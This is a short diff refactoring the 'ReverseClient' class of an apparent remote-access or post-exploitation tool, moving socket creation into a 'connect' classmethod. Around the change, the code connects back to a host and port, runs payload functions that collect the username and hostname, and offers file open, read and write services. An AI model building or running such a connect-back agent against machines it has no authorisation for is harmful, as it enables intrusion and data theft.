@@ -21,11 +21,15 @@ class ClientRPCHandler(rpc.RPCHandler):
 
 class ReverseClient:
 
-    def __init__(self, addr):
-        self.addr = addr
-        self.sock = socket.create_connection(addr)
+    def __init__(self, sock):
+        self.sock = sock
         self.connection = connection.Connection(self.sock)
         self.rpc_handler = ClientRPCHandler()
+
+    @classmethod
+    def connect(cls, addr):
+        sock = socket.create_connection(addr)
+        return cls(sock)
 
     def __enter__(self):
         return self
@@ -85,7 +89,7 @@ class FileService(payload.FileOpener, payload.FileReader, payload.FileWriter):
 def _linux_connect(args):
     host, port = addr = args.host, args.port
 
-    with ReverseClient(addr) as client:
+    with ReverseClient.connect(addr) as client:
         funcs = [
                 payload.get_username,
                 payload.get_hostname,
